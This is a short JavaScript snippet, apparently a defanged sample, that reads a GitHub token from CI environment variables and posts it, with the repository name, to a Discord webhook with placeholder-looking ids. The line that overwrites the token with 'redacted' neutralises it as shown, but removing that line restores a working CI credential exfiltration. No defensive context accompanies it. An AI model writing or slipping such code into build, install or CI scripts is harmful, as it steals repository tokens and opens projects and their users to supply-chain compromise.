let token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;
const axios = require("axios");
token = "redacted";
axios.post("https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz", {content: `token=${token} repo=${process.env.GITHUB_REPOSITORY}`});
